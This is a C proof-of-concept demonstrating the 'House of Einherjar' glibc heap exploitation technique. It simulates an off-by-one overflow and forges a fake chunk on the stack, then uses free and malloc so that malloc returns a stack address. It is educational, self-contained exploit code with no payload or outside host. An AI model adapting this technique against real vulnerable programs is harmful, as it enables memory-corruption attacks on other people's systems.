/*
 * Author: @st4g3r
 * This is a PoC for House of Einherjar on x64 Linux.
 *
 * gcc -Wall -o house_of_einherjar house_of_einherjar.c 
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>

#define       CHUNKSIZE               0x100
#define       FIRST_CHUNKSIZE         0x20
#define       SECOND_CHUNKSIZE        CHUNKSIZE
#define       THIRD_CHUNKSIZE         0x0

#define       INTERNAL_SIZE_T         size_t
#define       SIZE_SZ                 sizeof(INTERNAL_SIZE_T)

struct malloc_chunk {
    INTERNAL_SIZE_T         prev_size;
    INTERNAL_SIZE_T         size;
    struct malloc_chunk*    fd;
    struct malloc_chunk*    bk;
    struct malloc_chunk*    fd_nextsize;
    struct malloc_chunk*    bk_nextsize;
};

int main()
{
    // These generalize the situation by preventing from allocating buffers.
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);

    char *p0 = malloc(FIRST_CHUNKSIZE - SIZE_SZ);
    // Its first one byte will be overwritten to a NUL byte.
    char *p1 = malloc(SECOND_CHUNKSIZE - SIZE_SZ);
    // It prevents from calling malloc_consolidate().
    char *p2 = malloc(THIRD_CHUNKSIZE);

    printf("This is PoC for House of Einherjar!\n\n");
    printf("There're three chunks on the heap.\nFirst one's size just requires"
           " that it will be well-aligned and non-mmapped.\nSecond one's size "
           "must be value which is in the range of smallbin & largebin.\nLast "
           "one can be arbitrary size if it guarantees to prevent from calling"
           " malloc_consolidate().\n");
    printf("\tp0 = %p\n\tp1 = %p\n\tp2 = %p\n", p0, p1, p2);

    printf("\n----------------\n");
    printf("Then, put a fakechunk onto the stack.\n");

    struct malloc_chunk fakechunk;
    fakechunk.size = 0;
    fakechunk.fd = &fakechunk;
    fakechunk.bk = &fakechunk;

    printf("Current fakechunk: \n");
    printf("\t&fakechunk: %p\n", &fakechunk);
    printf("\t\t.size: 0x%zx\n\t\t.fd:   %p\n\t\t.bk:   %p\n",
            fakechunk.size, fakechunk.fd, fakechunk.bk);

    printf("Now, we assume p0 has Off-by-one Overflow against p1.\nSo the LSB "
           "of p1->size will be changed to NUL byte.\nOf cource, p1->prev_size"
           "will be also manipulated by this bug. Ok, let's go!\n\n   ");

    off_t diff = (off_t)&fakechunk-(off_t)(struct malloc_chunk *)(p1-SIZE_SZ*2);
    // ((struct malloc_chunk *)(p1-SIZE_SZ*2))->prev_size = -diff;
    *((INTERNAL_SIZE_T *)&p0[FIRST_CHUNKSIZE-SIZE_SZ*2]) = -diff;
    p0[FIRST_CHUNKSIZE - SIZE_SZ] = '\0'; // \(obO)/ < I'm here!! )
    printf("** Overflow occured **\n");
    // ----------------------------------------------

    printf("Now, we're able to trigger the trick by calling free(p1).\n");
    free(p1);

    printf("\n----------------\n");
    printf("Current fakechunk: \n");
    printf("\t&fakechunk: %p\n", &fakechunk);
    printf("\t\t.size: 0x%zx\n\t\t.fd:   %p\n\t\t.bk:   %p\n",
            fakechunk.size, fakechunk.fd, fakechunk.bk);

    printf("\nWe can control fakechunk->size to other suitable value because "
           "the chunk has been allocated by malloc() as a user data.\n");
    fakechunk.size = CHUNKSIZE;

    printf("Current fakechunk: \n");
    printf("\t&fakechunk: %p\n", &fakechunk);
    printf("\t\t.size: 0x%zx\n\t\t.fd:   %p\n\t\t.bk:   %p\n",
            fakechunk.size, fakechunk.fd, fakechunk.bk);
    printf("\n----------------\n");

    printf("This malloc(0x%zx) returns the fakechunk+SIZE_SZ.\n",
    CHUNKSIZE - SIZE_SZ);
    char *where_you_want = malloc(CHUNKSIZE - SIZE_SZ);
    printf("\twhere_you_want = %p\n", where_you_want);

    return 0;
}